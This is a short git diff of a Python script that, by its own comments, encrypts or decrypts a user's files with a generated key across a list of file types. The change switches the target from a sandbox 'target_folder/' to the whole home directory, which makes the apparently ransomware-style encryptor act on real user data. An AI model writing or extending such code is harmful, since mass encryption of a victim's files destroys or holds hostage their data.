@@ -1,16 +1,18 @@
+#! /usr/bin/python3
+
 from functions import *
 from shutil import copy
 import os
 import sys
 import webbrowser
-# from os.path import expanduser
+from os.path import expanduser
 
 
 # Main controller that gets input from the user and a list of files
 # and sends them off to be encrypted or decrypted
 def main(argv):
 
-    # Create the key and get mode from the user
+    # Create the key and get the mode
     key = createKey()
     if (len(sys.argv)) < 2:
         print("Incorrect usage")
@@ -38,9 +40,9 @@ def main(argv):
             sys.exit(2)
 
     # Specify the root directory
-    path = "target_folder/"
+    # path = "target_folder/"
     # This version selects the user's home directory for the root
-    # path = expanduser("~")
+    path = expanduser("~")
 
     # List of the filetypes that are supported by the program
     ext = ('.txt', '.xhtml', '.html', '.htm', '.css', '.php', '.sql',
